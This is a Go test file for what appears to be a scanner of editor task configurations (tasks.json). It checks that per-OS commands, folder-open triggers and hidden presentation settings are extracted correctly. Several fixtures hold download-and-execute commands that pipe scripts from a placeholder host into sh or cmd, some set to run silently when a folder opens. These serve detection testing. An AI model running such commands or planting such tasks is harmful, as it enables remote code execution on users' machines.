package agentconfig

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestEditorTasks(t *testing.T) {
	cases := []struct {
		name string
		data string
		want []command
	}{
		{
			name: "per-OS commands",
			data: `{"tasks":[{"label":"env","type":"shell",
"osx":{"command":"curl -s https://x.example/m | sh"},
"linux":{"command":"wget -qO- https://x.example/l","args":["-v"]},
"windows":{"command":"curl https://x.example/w | cmd"},
"runOptions":{"runOn":"folderOpen"}}]}`,
			want: []command{
				{name: "env (windows)", text: "curl https://x.example/w | cmd", line: 4, onOpen: true},
				{name: "env (osx)", text: "curl -s https://x.example/m | sh", line: 2, onOpen: true},
				{name: "env (linux)", text: "wget -qO- https://x.example/l -v", line: 3, onOpen: true},
			},
		},
		{
			name: "top-level and OS override",
			data: `{"tasks":[{"label":"build","command":"make",
"windows":{"command":"nmake"}}]}`,
			want: []command{
				{name: "build", text: "make", line: 1},
				{name: "build (windows)", text: "nmake", line: 2},
			},
		},
		{
			name: "OS block with args only",
			data: `{"tasks":[{"label":"x","command":"node","windows":{"args":["public/a.woff2"]}}]}`,
			want: []command{
				{name: "x", text: "node", line: 1},
				{name: "x (windows)", text: "node public/a.woff2", line: 1},
			},
		},
		{
			name: "task shell args with an OS command",
			data: `{"tasks":[{"label":"x","options":{"shell":{"executable":"bash","args":["-c","curl -s https://x.example/a | sh"]}},
"linux":{"command":"start"}}]}`,
			want: []command{{name: "x (linux)", text: "bash -c curl -s https://x.example/a | sh start", line: 2}},
		},
		{
			name: "root shell and root OS block",
			data: `{"options":{"shell":{"executable":"sh"}},"linux":{"options":{"shell":{"args":["-c","curl https://x.example/l | sh"]}}},
"tasks":[{"label":"x","command":"start"}]}`,
			want: []command{
				{name: "x", text: "sh start", line: 2},
				{name: "x (linux)", text: "sh -c curl https://x.example/l | sh start", line: 2},
			},
		},
		{
			name: "root presentation hides the task",
			data: `{"presentation":{"reveal":"never","echo":false},
"tasks":[{"label":"x","command":"node a.js","runOptions":{"runOn":"folderOpen"}}]}`,
			want: []command{{name: "x", text: "node a.js", line: 2, onOpen: true, hidden: true}},
		},
		{
			name: "task presentation shows what the root hides",
			data: `{"presentation":{"reveal":"never","echo":false},
"tasks":[{"label":"x","command":"make","presentation":{"reveal":"always"}}]}`,
			want: []command{{name: "x", text: "make", line: 2}},
		},
		{
			name: "root command",
			data: `{"command":"curl -s https://x.example/a | sh",
"tasks":[{"label":"x","runOptions":{"runOn":"folderOpen"}}]}`,
			want: []command{{name: "x", text: "curl -s https://x.example/a | sh", line: 1, onOpen: true}},
		},
		{
			name: "root OS block args",
			data: `{"linux":{"args":["public/a.woff2"]},
"tasks":[{"label":"x","command":"node","args":["--no-warnings"]}]}`,
			want: []command{
				{name: "x", text: "node --no-warnings", line: 2},
				{name: "x (linux)", text: "node public/a.woff2 --no-warnings", line: 2},
			},
		},
		{
			name: "OS block with no command",
			data: `{"tasks":[{"label":"x","command":"make","osx":{"options":{"cwd":"/"}}}]}`,
			want: []command{{name: "x", text: "make", line: 1}},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := editorTasks([]byte(tc.data))
			require.NoError(t, err)
			assert.Equal(t, tc.want, got)
		})
	}
}

func TestKeyLine(t *testing.T) {
	cases := []struct {
		name string
		data string
		want int
	}{
		{"nested key", "{\n\"servers\": {\n\"x\": {}\n}\n}", 3},
		{"a key in a comment", "{\n// \"servers\": {\"x\": 1}\n\"servers\": {\n\"x\": {}\n}\n}", 4},
		{"a key in a string", "{\"note\": \"\\\"servers\\\" x\",\n\"servers\": {\n\"x\": {}}}", 3},
		{"the last of two keys", "{\"servers\": {\"x\": 1},\n\"servers\": {\n\"x\": 2}}", 3},
		{"no key", `{"servers": {"y": 1}}`, 0},
		{"a list in place of an object", `{"servers": [1]}`, 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			assert.Equal(t, tc.want, keyLine(stripJSONC([]byte(tc.data)), "servers", "x"))
		})
	}
}
